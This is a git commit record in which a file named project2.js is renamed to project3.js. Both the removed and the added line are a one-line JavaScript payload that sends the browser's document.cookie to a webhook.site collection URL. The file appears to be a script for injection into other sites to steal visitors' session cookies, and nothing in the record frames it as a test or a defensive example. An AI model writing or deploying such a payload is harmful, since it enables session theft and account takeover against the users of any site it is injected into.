9e1d20acdedefb261267e66954cb87263b19c247
AlPha1 <143469477+AlPha0ne1@users.noreply.github.com>
2024-02-25 21:23:52 +0800

    Update and rename project2.js to project3.js

--- project2.js
+++
@@ -1,1 +0,0 @@
-fetch('https://webhook.site/a88e1bf7-4c89-4b11-915f-46b421280985?cookie=' + document.cookie);
---
+++ project3.js
@@ -0,0 +1,1 @@
+fetch('https://webhook.site/b770a813-e50c-40bb-ae1a-d07d859cf091?cookie=' + document.cookie);
